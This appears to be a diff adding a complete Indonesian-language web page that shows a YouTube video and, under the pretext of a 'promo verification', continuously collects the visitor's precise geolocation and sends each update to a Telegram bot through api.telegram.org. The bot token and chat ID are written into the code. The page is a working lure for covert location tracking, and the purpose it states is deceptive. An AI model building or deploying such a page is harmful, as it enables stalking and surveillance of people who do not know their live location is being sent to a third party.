@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video & Live Tracker</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        #video-container { text-align: center; margin-bottom: 20px; }
+        #youtube-video { width: 100%; max-width: 560px; height: 315px; border: none; }
+        #output { background: #e9ecef; padding: 15px; border-radius: 5px; white-space: pre-wrap; margin-top: 10px; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
+        button:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <h1>Nonton Video Ini Dulu!</h1>
+    <p>Klik tombol di bawah buat verif dan track promo spesial. Share lokasi lo ya!</p>
+    
+    <div id="video-container">
+        <!-- Ganti VIDEO_ID dengan ID YouTube lo, misal dQw4w9WgXcQ untuk Rick Roll -->
+        <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" allowfullscreen></iframe>
+    </div>
+    
+    <button onclick="startTrack()">Mulai Verif & Track</button>
+    <button onclick="stopTrack()">Stop</button>
+    <div id="output">Klik Mulai buat mulai tracking dan kirim data...</div>
+
+    <script>
+        // Ganti ini dengan data bot lo
+        const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE'; // Dari BotFather
+        const CHAT_ID = '7680606818'; // ID chat lo
+        
+        let watchId;
+        const output = document.getElementById('output');
+
+        // Fungsi kirim pesan ke Telegram (lat, lng, accuracy, timestamp)
+        async function sendToTelegram(lat, lng, accuracy, timestamp) {
+            const message = `Lokasi Baru!\nLatitude: ${lat}\nLongitude: ${lng}\nAkurasi: ${accuracy}m\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            try {
+                const response = await fetch(url);
+                if (response.ok) {
+                    console.log('Data lokasi terkirim ke Telegram!');
+                    output.innerHTML += `\n--- Dikirim ke bot: ${message}`;
+                } else {
+                    console.error('Gagal kirim ke Telegram:', response.status);
+                    output.innerHTML += `\n--- Error kirim ke bot: ${response.status}`;
+                }
+            } catch (error) {
+                console.error('Error fetch:', error);
+                output.innerHTML += `\n--- Error: ${error.message}`;
+            }
+        }
+
+        function startTrack() {
+            if (navigator.geolocation) {
+                output.innerHTML = 'Mulai tracking... Tunggu permission.';
+                watchId = navigator.geolocation.watchPosition(showPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0 // Update fresh terus
+                });
+            } else {
+                output.innerHTML = 'Geolocation nggak support di browser ini.';
+            }
+        }
+
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const time = position.timestamp;
+            
+            // Tampil di halaman
+            output.innerHTML = `Lat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}\nAccuracy: ${acc.toFixed(0)}m\nTime: ${new Date(time).toLocaleString('id-ID')}\n--- Update terbaru ---`;
+            
+            // Otomatis kirim ke Telegram
+            sendToTelegram(lat, lng, acc, time);
+        }
+
+        function showError(error) {
+            let msg = 'Error: ';
+            switch(error.code) {
+                case error.PERMISSION_DENIED: msg += 'Permission ditolak.'; break;
+                case error.POSITION_UNAVAILABLE: msg += 'Lokasi nggak tersedia.'; break;
+                case error.TIMEOUT: msg += 'Timeout.'; break;
+            }
+            output.innerHTML = msg;
+        }
+
+        function stopTrack() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+                output.innerHTML += '\n--- Tracking dihentikan.';
+            }
+        }
+    </script>
+</body>
+</html>
